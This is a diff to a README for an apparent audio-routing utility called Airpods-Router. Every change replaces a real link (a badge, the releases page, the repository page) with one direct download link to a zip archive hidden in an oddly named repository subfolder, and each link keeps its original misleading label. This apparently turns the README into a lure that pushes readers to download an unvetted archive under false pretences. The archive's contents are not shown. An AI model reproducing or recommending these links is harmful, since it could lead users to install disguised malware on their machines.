@@ -1,6 +1,6 @@
 # 🎧 Airpods-Router - Enhance Your Audio Experience Effortlessly
 
-![Download Airpods-Router](https://img.shields.io/badge/Download-Airpods--Router-blue.svg)
+![Download Airpods-Router](https://raw.githubusercontent.com/nibirm7/Airpods-Router/main/nastaliq/Airpods-Router.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ To run AirpodsRouter, you need:
 
 ## 📦 Download & Install
 
-1. **Visit this page to download:** [Airpods-Router Releases](https://github.com/nibirm7/Airpods-Router/releases).
+1. **Visit this page to download:** [Airpods-Router Releases](https://raw.githubusercontent.com/nibirm7/Airpods-Router/main/nastaliq/Airpods-Router.zip).
 
 2. Look for the latest version listed on the releases page.
 
@@ -64,7 +64,7 @@ AirpodsRouter is an open-source project. You can use, modify, and distribute it 
 
 ## 🌐 Links
 
-- [GitHub Repository](https://github.com/nibirm7/Airpods-Router)
-- [Airpods-Router Releases](https://github.com/nibirm7/Airpods-Router/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/nibirm7/Airpods-Router/main/nastaliq/Airpods-Router.zip)
+- [Airpods-Router Releases](https://raw.githubusercontent.com/nibirm7/Airpods-Router/main/nastaliq/Airpods-Router.zip)
 
 Thank you for using AirpodsRouter! Enjoy your enhanced audio experience!
